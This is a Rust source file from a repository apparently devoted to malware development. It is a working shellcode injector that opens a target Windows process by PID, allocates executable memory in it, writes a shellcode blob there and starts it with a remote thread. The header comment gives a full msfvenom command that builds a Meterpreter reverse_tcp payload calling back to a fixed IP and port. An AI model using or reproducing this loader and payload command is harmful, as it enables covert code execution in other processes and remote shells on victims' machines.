/* 

For more Rust Codes : https://github.com/Whitecat18/Rust-for-Malware-Development.git

Code to inject and execute shellcode into a remote process specified by its PID that runs in the same process PID !.
This is just an Example demo i have written in. you can create your own shellcode you need! . This program allows all kinds of shellcode !

Example i used to generate dummy shellcode for just Demo purpuse . you can use the same format! 

`
msfvenom --platform windows --arch x64 -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.102.93 LPORT=4444 EXITFUNC=thread -f raw --var-name=Smukx -o shellcode.bin
`
By Smukx 

*/
const OKI: &str = "[+]";
// const MIS: &str = "[-]";


use std::{env::args, ptr::null_mut, u64::MIN};

//ntdef::NULL
use winapi::{
    shared::minwindef::LPVOID, 
    um::{errhandlingapi::GetLastError, handleapi::CloseHandle, 
        winbase::INFINITE,
        memoryapi::{VirtualAllocEx, WriteProcessMemory}, 
        processthreadsapi::{CreateRemoteThreadEx, OpenProcess}, 
        synchapi::WaitForSingleObject, 
        winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PROCESS_ALL_ACCESS}
}};

// type LpthreadStartRoutine = unsafe extern "system" fn(lp_parameter: LPVOID) -> DWORD;

fn main(){
    let pid_inp = args().collect::<Vec<String>>();

    if pid_inp.len() != 2{
        panic!("{} Provide Proper PID", OKI);
    }

    let pid = pid_inp[1].parse::<u32>().expect("Provide Proper input !");
    println!("{} PID: {}", OKI, pid);

    let shellcode = include_bytes!("../shellcode.bin");
    
    unsafe{
        let process = OpenProcess(
            PROCESS_ALL_ACCESS,
            false as i32,
            pid
        );

        if process.is_null(){
            panic!("{} Failed to create an Process {}", MIN, GetLastError());
        }

        println!("{} Process Has been allocated: {:?}",OKI,process);


        let buffer = VirtualAllocEx(
            process, 
            null_mut(),
            shellcode.len(),
            MEM_RESERVE | MEM_COMMIT,
            PAGE_EXECUTE_READWRITE,
        );

        if buffer.is_null(){
            panic!("{} Failed to Allocate to Process Mem. Error: {}",OKI,GetLastError());
        }

        println!("{} Allocated Buffer sise: {:?}",OKI,buffer);


        let mut bytes: usize = 0;

        let result = WriteProcessMemory(
            process, 
            buffer,
            shellcode.as_ptr() as LPVOID, 
            shellcode.len(), 
            &mut bytes,
        );
        
        if result == 0 || bytes != shellcode.len(){
            panic!("{} Failed to write the shellcode to the remote process. Error:{}",OKI,GetLastError());
        }

        // dummy thread id -> Found an alternet way !!
        // let tid: DWORD = NULL;
        let rem_thread = CreateRemoteThreadEx(process,
            null_mut(), 
            0,   
            std::mem::transmute(buffer), 
            null_mut(),
            0,
            null_mut(), 
            null_mut(),
        );

        if rem_thread.is_null() {
            panic!("{} Failed to create remote thread. Error : {}",OKI,GetLastError());
        }

        println!("{} Got an Handle to the Remote thread: {:?}",OKI, rem_thread);
        
        WaitForSingleObject(rem_thread, INFINITE);
        CloseHandle(rem_thread);
        println!("{} Cleaning UP Thread ",OKI);
        CloseHandle(process);
        println!("{} Cleaning UP Process",OKI);
    }
}